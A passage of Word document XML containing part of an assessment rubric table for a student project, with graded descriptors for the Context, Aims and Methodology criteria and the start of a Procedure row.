              <w:t>Little context for project.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="678FEF51" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>No context for project.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="05DAC78B" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="795"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="13054F21" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Aims</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4DB95D69" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B41565E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Clear and </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>well defined</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> aims. Aims are clear, well formatted and achievable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="749B2A17" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Clear and </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>well defined</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> aims. Aims are clear, formatted to a reasonable standard and achievable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FAA9B4E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Aims are clear, formatted to a reasonable standard and achievable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F14EF5A" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Project Aim satisfactorily expressed. Aims may not stand out in the report</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="712F3ED0" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Project aim inappropriate, not well defined or stand out.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C8999B7" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Project Aim </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>confused ,</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> ill defined or unachievable..</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="2D8F3E35" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="795"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3525CC9B" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Methodology</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="06271720" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24AEDEAC" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>The methodology has been clearly defined. It is clear what tools will be used and why.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="63A1413A" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>The methodology has been well defined. It is reasonably clear what tools will be used and why.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C50389E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>The methodology and the tools to be used have been defined.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C98EA79" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>An adequate description of the methodology and the tools to be used has been included.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4168256F" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>It is unclear what methodology or tools will be used.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5370E85E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>The methodology has been poorly defined or not defined.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="512D2EAB" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="795"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B524BD8" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Procedure</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
